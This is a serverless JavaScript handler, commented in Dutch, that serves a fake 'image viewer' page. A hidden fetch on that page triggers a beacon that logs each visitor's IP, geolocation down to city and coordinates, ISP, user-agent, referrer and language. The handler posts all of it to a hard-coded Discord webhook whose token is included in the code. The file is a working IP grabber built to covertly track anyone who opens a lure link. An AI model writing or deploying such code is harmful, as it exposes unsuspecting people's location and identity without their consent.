// api/index.js — één bestand, alles in één
// GET /            -> decoy HTML pagina (vuurt beacon)
// GET /api/index   -> zelfde HTML
// GET ?beacon=1    -> track + webhook post

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565077459559252048/IQQWuDIPCoO0sZqzU_YCV12JmPFGJi9BrBjZ0_KqZ6JMPtGSNVfxKMqWvopnlXYyL4zj';

const DECOY_HTML = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>image viewer</title>
<style>
  :root { color-scheme: dark; }
  body { margin: 0; min-height: 100vh; display: grid; place-items: center;
         background: #0b0d10; color: #e6e8eb;
         font: 15px/1.5 ui-monospace, Menlo, Consolas, monospace; }
  main { text-align: center; }
  .img { width: min(560px, 90vw); aspect-ratio: 16/9;
         background: linear-gradient(135deg, #1f6feb, #7ee787);
         border-radius: 12px; margin-bottom: 1rem; }
  p { color: #8a9199; margin: 0; }
</style>
</head>
<body>
  <main>
    <div class="img"></div>
    <p>loading image…</p>
  </main>
  <script>
    fetch('?beacon=1', { keepalive: true }).catch(() => {});
  </script>
</body>
</html>`;

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  const url = new URL(req.url, 'http://x');
  const isBeacon = url.searchParams.get('beacon') === '1';

  if (!isBeacon) {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(DECOY_HTML);
  }

  const ip =
    req.headers['x-real-ip'] ||
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    (req.socket && req.socket.remoteAddress) ||
    'unknown';
  const cleanIp = ip.startsWith('::ffff:') ? ip.slice(7) : ip;

  let geo = {};
  try {
    const r = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(cleanIp)}` +
      `?fields=status,country,regionName,city,isp,org,as,timezone,lat,lon,proxy,hosting`
    );
    if (r.ok) geo = await r.json();
  } catch (e) {
    geo = { status: 'fail', message: e.message };
  }

  const ua = req.headers['user-agent'] || 'unknown';
  const ref = req.headers['referer'] || 'direct';
  const lang = req.headers['accept-language'] || 'unknown';
  const color = geo.proxy ? 0xf85149 : geo.hosting ? 0xd29922 : 0x7ee787;

  const payload = {
    username: 'ip bench',
    embeds: [{
      title: 'hit',
      color,
      fields: [
        { name: 'ip', value: `\`${cleanIp}\``, inline: true },
        { name: 'country', value: geo.country || '?', inline: true },
        { name: 'region', value: geo.regionName || '?', inline: true },
        { name: 'city', value: geo.city || '?', inline: true },
        { name: 'isp', value: geo.isp || '?', inline: true },
        { name: 'org', value: geo.org || '?', inline: true },
        { name: 'asn', value: geo.as || '?', inline: false },
        { name: 'timezone', value: geo.timezone || '?', inline: true },
        { name: 'coords', value: geo.lat != null ? `${geo.lat}, ${geo.lon}` : '?', inline: true },
        { name: 'proxy', value: geo.proxy ? 'yes' : 'no', inline: true },
        { name: 'hosting', value: geo.hosting ? 'yes' : 'no', inline: true },
        { name: 'referrer', value: String(ref).slice(0, 200), inline: false },
        { name: 'user-agent', value: String(ua).slice(0, 1000), inline: false },
        { name: 'language', value: String(lang).slice(0, 100), inline: true }
      ],
      timestamp: new Date().toISOString(),
      footer: { text: 'olliE bench' }
    }]
  };

  try {
    const wh = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!wh.ok) return res.status(200).json({ ok: false, upstream: wh.status });
  } catch (e) {
    return res.status(200).json({ ok: false, err: e.message });
  }

  res.status(200).json({ ok: true });
}
